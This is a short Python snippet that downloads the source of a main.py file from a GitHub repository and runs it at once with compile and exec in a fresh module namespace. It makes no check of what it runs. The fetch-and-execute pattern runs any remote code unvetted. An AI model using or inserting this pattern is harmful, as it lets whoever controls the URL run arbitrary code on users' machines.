from urllib.request import urlopen
from types import ModuleType

with urlopen('https://raw.githubusercontent.com/uniuxify/nlp-help/main/main.py') as resp:
  src = (resp.read().decode())

compiled = compile(src, '', 'exec')
ff = ModuleType("testmodule")
exec(compiled, ff.__dict__)